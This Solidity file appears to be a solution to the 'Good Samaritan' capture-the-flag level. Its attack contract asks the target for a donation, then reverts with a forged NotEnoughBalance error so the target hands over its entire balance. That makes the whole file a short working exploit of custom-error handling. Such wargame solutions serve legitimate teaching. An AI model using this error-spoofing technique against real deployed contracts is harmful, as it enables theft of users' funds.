// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface INotifyable {
    function notify(uint256 amount) external;
}

interface IGoodSamaritan {
    function requestDonation() external returns (bool enoughBalance);
}

contract GoodSamaritanAttack is INotifyable {
    error NotEnoughBalance();

    function attack(IGoodSamaritan _target) external {
        _target.requestDonation();
    }

    function notify(uint256 amount) external pure override {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
